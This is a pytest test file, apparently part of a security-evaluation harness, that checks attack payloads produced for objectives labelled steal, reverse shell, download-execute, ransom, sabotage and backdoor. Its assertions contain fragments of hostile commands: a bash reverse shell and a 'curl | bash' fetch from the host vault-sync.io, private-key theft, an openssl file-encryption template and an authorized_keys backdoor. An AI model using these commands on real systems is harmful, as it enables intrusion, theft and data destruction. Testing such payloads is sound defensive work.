from __future__ import annotations

import json
from pathlib import Path

import pytest

from keyvault.payloads import PayloadEvidence, raise_payload, summarize_encoded
from keyvault.prepare_data import generate_seed


@pytest.fixture()
def data_dir(tmp_path: Path) -> Path:
    root = Path(__file__).resolve().parents[1]
    target = tmp_path / "keyvault_data"
    generate_seed(target)
    return target


def capture(objective: str, data_dir: Path) -> dict[str, object]:
    with pytest.raises(PayloadEvidence) as excinfo:
        raise_payload(objective, data_dir)
    return summarize_encoded(str(excinfo.value))


def test_steal_collects_real_private_key(data_dir: Path) -> None:
    evidence = capture("STEAL", data_dir)
    assert evidence["param"] == "data"
    assert "BEGIN RSA PRIVATE KEY" in str(evidence["decoded"])


def test_rshell_collects_complete_command(data_dir: Path) -> None:
    evidence = capture("RSHELL", data_dir)
    assert evidence["param"] == "shell"
    assert "bash -i" in str(evidence["decoded"])
    assert "/dev/tcp/vault-sync.io/443" in str(evidence["decoded"])


def test_payload_collects_download_execute_command(data_dir: Path) -> None:
    evidence = capture("PAYLOAD", data_dir)
    assert evidence["param"] == "payload"
    assert "curl vault-sync.io:443/kv-update.sh" in str(evidence["decoded"])
    assert "| bash" in str(evidence["decoded"])


def test_ransom_collects_key_files_and_command_template(data_dir: Path) -> None:
    evidence = capture("RANSOM", data_dir)
    decoded = evidence["decoded_json"]
    assert isinstance(decoded, dict)
    assert decoded["files"]
    assert any(Path(item).name == "id_rsa" for item in decoded["files"])
    assert decoded["cmd_template"] == "openssl cms -encrypt -aes256 -out {file}.enc {file}"


def test_sabotage_collects_non_hidden_files(data_dir: Path) -> None:
    evidence = capture("SABOTAGE", data_dir)
    decoded = evidence["decoded_json"]
    assert isinstance(decoded, dict)
    assert decoded["files"]
    assert all(not Path(item).name.startswith(".") for item in decoded["files"])


def test_backdoor_collects_key_and_path(data_dir: Path) -> None:
    evidence = capture("BACKDOOR", data_dir)
    assert evidence["param"] == "key"
    assert "ssh-rsa" in str(evidence["decoded"])
    assert "authorized_keys" in str(evidence["path"])


def test_evidence_parser_supports_backdoor_path_suffix(data_dir: Path) -> None:
    evidence = capture("BACKDOOR", data_dir)
    rendered = json.dumps(evidence, ensure_ascii=False)
    assert "authorized_keys" in rendered
